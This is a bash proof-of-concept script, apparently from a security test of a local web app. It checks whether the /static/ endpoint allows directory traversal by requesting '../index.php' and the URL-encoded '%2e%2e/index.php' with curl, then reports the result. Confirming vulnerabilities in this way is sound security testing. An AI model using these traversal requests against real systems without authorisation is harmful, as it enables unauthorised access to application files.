#!/bin/bash

# POC: Directory Traversal in /static/ Endpoint
# This script demonstrates that the /static/ endpoint allows directory traversal
# to access files outside the static directory using ../ sequences

TARGET="http://localhost:3000"
BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${BOLD}=== Directory Traversal Vulnerability POC ===${NC}\n"

# Test 1: Verify /static/ directory itself returns 403
echo -e "${BOLD}[Test 1]${NC} Accessing /static/ directory directly (should be 403):"
RESPONSE1=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/static/")
echo "Request: GET ${TARGET}/static/"
echo -e "Response: HTTP ${RESPONSE1}"
if [ "$RESPONSE1" = "403" ]; then
    echo -e "${GREEN}✓ Expected behavior: Directory listing disabled${NC}\n"
else
    echo -e "${YELLOW}⚠ Unexpected response code${NC}\n"
fi

# Test 2: Directory traversal with standard ../ sequence
echo -e "${BOLD}[Test 2]${NC} Directory traversal using ../ to access index.php:"
echo "Request: GET ${TARGET}/static/../index.php"
RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}\nCONTENT_TYPE:%{content_type}" "${TARGET}/static/../index.php")
HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE:" | cut -d: -f2)
CONTENT_TYPE2=$(echo "$RESPONSE2" | grep "CONTENT_TYPE:" | cut -d: -f2)
BODY2=$(echo "$RESPONSE2" | sed '/HTTP_CODE:/d' | sed '/CONTENT_TYPE:/d')

echo "Response: HTTP ${HTTP_CODE2}"
echo "Content-Type: ${CONTENT_TYPE2}"
echo "Body length: ${#BODY2} bytes"

if [ "$HTTP_CODE2" = "200" ] && [[ "$BODY2" == *"<!DOCTYPE"* || "$BODY2" == *"<html"* ]]; then
    echo -e "${RED}✗ VULNERABLE: Successfully accessed index.php via directory traversal!${NC}"
    echo "First 200 characters of response:"
    echo "$BODY2" | head -c 200
    echo -e "\n"
    VULN_FOUND=1
else
    echo -e "${GREEN}✓ Not vulnerable: Unable to access index.php${NC}\n"
    VULN_FOUND=0
fi

# Test 3: URL-encoded directory traversal
echo -e "${BOLD}[Test 3]${NC} Directory traversal using URL-encoded %2e%2e/ sequence:"
echo "Request: GET ${TARGET}/static/%2e%2e/index.php"
RESPONSE3=$(curl -s -w "\nHTTP_CODE:%{http_code}\nCONTENT_TYPE:%{content_type}" "${TARGET}/static/%2e%2e/index.php")
HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE:" | cut -d: -f2)
CONTENT_TYPE3=$(echo "$RESPONSE3" | grep "CONTENT_TYPE:" | cut -d: -f2)
BODY3=$(echo "$RESPONSE3" | sed '/HTTP_CODE:/d' | sed '/CONTENT_TYPE:/d')

echo "Response: HTTP ${HTTP_CODE3}"
echo "Content-Type: ${CONTENT_TYPE3}"
echo "Body length: ${#BODY3} bytes"

if [ "$HTTP_CODE3" = "200" ] && [[ "$BODY3" == *"<!DOCTYPE"* || "$BODY3" == *"<html"* ]]; then
    echo -e "${RED}✗ VULNERABLE: URL-encoded traversal also works!${NC}\n"
    VULN_FOUND=1
else
    echo -e "${GREEN}✓ Not vulnerable: URL-encoded traversal blocked${NC}\n"
fi

# Test 4: Verify normal static file access works
echo -e "${BOLD}[Test 4]${NC} Verifying legitimate static file access works:"
echo "Request: GET ${TARGET}/static/springfield_background.jpg"
RESPONSE4=$(curl -s -o /dev/null -w "%{http_code}|%{content_type}" "${TARGET}/static/springfield_background.jpg")
HTTP_CODE4=$(echo "$RESPONSE4" | cut -d'|' -f1)
CONTENT_TYPE4=$(echo "$RESPONSE4" | cut -d'|' -f2)

echo "Response: HTTP ${HTTP_CODE4}"
echo "Content-Type: ${CONTENT_TYPE4}"

if [ "$HTTP_CODE4" = "200" ] && [[ "$CONTENT_TYPE4" == *"image"* ]]; then
    echo -e "${GREEN}✓ Static file served correctly${NC}\n"
else
    echo -e "${YELLOW}⚠ Static file access may not be working${NC}\n"
fi

# Summary
echo -e "${BOLD}=== Summary ===${NC}"
if [ "$VULN_FOUND" = "1" ]; then
    echo -e "${RED}VULNERABILITY CONFIRMED: Directory traversal is possible in /static/ endpoint${NC}"
    echo "Attackers can bypass /static/ restrictions and access application files in web root."
else
    echo -e "${GREEN}No vulnerability detected: Directory traversal appears to be blocked${NC}"
fi

# Exit 0 for successful POC execution (vulnerability was successfully demonstrated)
exit 0